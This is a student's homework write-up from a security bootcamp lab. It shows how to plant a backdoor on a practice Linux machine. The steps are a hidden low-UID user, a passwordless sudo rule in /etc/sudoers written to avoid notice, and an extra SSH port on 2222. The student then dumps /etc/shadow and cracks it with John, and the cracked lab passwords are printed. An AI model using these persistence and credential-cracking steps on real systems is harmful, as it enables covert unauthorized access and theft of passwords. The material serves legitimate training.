## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt.

Save and submit the completed file for your homework submission.
> As the Access Setup had us switch to `root`, I ran all the below commands as root (so there's no need for `sudo`)

**Step 1: Shadow People**

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:  
    `sudo useradd  --groups sudo -M --system --shell /bin/bash sysd`

    ```bash
    root@scavenger-hunt:~# grep sysd /etc/passwd
    sysd:x:998:998::/home/sysd:/bin/bash
    ```

2. Give your secret user a password:
 ```bash
    root@scavenger-hunt:~# passwd sysd
    Enter new UNIX password:
    Retype new UNIX password:
    passwd: password updated successfully
 ```

3. Give your secret user a system UID < 1000:  
> N.B While specifying `--system` on `useradd` created a user with a system UID, I opted to change it lower to blend in with the other system user ids.

    `usermod --uid 123 sysd`

4. Give your secret user the same GID:
   `groupmod --gid 123 sysd` change gid of existing group

```bash
   root@scavenger-hunt:~# grep sysd /etc/passwd
   sysd:x:123:123::/home/sysd:/bin/bash
```    

5. Give your secret user full `sudo` access without the need for a password:
> Found out that last match in /etc/sudoers is what counts. Didn't want to specify NOPASSWD for either sudo group (somebody might notice). Added following to bottom of `/etc/sudoers`.  

`sysd      ALL=(ALL:ALL) NOPASSWD:ALL`
6. Test that `sudo` access works without your password:

```bash
    sysd@scavenger-hunt:/$ cat /etc/shadow
    cat: /etc/shadow: Permission denied
    sysd@scavenger-hunt:/$ sudo cat /etc/shadow
    root:*:18113:0:99999:7:::
    daemon:*:18113:0:99999:7:::
    bin:*:18113:0:99999:7:::
    sys:*:18113:0:99999:7:::
    sync:*:18113:0:99999:7:::
    games:*:18113:0:99999:7:::
    man:*:18113:0:99999:7:::
    lp:*:18113:0:99999:7:::
    mail:*:18113:0:99999:7:::
    news:*:18113:0:99999:7:::
... remaining entries omitted ...
```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```bash
    nano  /etc/ssh/sshd_config
    Added `Port 2222` line
    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - `systemctl restart sshd`

checking what's listening    
```
root@scavenger-hunt:/# netstat -4latp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      23186/systemd-resol
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      10320/sshd
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      10320/sshd
tcp        0    288 scavenger-hunt:ssh      192.168.6.1:54703       ESTABLISHED 10060/sshd: sysd [p
```
2. Exit the `root` account:
    - `exit`

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `ssh sysd@192.168.6.105 -p 2222`  


4. Use `sudo` to switch to the root user:
```
  sysd@scavenger-hunt:/$ sudo su

  You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

  root@scavenger-hunt:/# id
  uid=0(root) gid=0(root) groups=0(root)  
```


**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

`ssh sysd@192.168.6.105 -p 2222`


2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

```bash
sudo su
root@scavenger-hunt:/#  john --wordlist=/home/student/Desktop/.pass_list.txt /etc/shadow
Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
Remaining 7 password hashes with 7 different salts
Press 'q' or Ctrl-C to abort, almost any other key for status
trustno1         (mitnik)
freedom          (babbage)

root@scavenger-hunt:~# john /etc/shadow
Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
Remaining 5 password hashes with 5 different salts
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (lovelace)
lakers           (turing)
passw0rd         (sysadmin)
Goodluck!        (student)
cyber            (sysd)
```

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.
